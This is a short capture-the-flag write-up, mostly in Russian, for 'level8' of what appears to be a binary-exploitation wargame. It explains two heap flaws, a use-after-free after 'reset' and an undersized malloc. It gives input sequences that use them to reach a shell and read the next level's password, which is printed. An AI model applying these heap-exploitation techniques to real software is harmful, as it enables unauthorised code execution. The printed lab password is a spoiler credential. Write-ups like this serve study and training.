1) strings level8 | less
[...]
%p, %p
auth
reset
service
login
/bin/sh
Password:
[...]

2) ./level8
(nil), (nil)
> auth
0x804a008, (nil)
> service
0x804a008, 0x804a018
> login
Password:
> auth
0x804a028, 0x804a018
> auth
0x804a038, 0x804a018


2) Существует два способа эксплуатации этого двоичного файла.

Первый - аутентификация с помощью auth и имени пользователя, состоящего менее чем из 16 символов, например, auth admin. 
При выполнении команды reset выделенное пространство будет освобождено, но указатель не будет установлен в NULL, 
поэтому при использовании команды service (servic) будет использоваться та же область памяти, а если аргумент имеет длину 31 байт, то 32-й байт будет установлен в '\0'.
Сервис и auth имеют один и тот же адрес, проверка 32-го символа auth аналогична проверке 32-го символа сервиса. 

Таким образом, можно сделать логин, который запустит shell, что позволит восстановить содержимое /home/user/level9/.pass.

auth 123
reset
service1234567890123456789012345678901
login



Второй метод возникает из-за ошибки malloc, действительно, выделение составляет 4 байта, когда должно быть 36 байт (name[32] + int). 
Размер METADATA составляет 8 байт, следующее распределение начнется с auth + 12. Поскольку проверка осуществляется по auth + 32, можно добавить 19 байт, чтобы '\0' был хорошо расположен.


auth 123
service1234567890123456789
login

3) cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
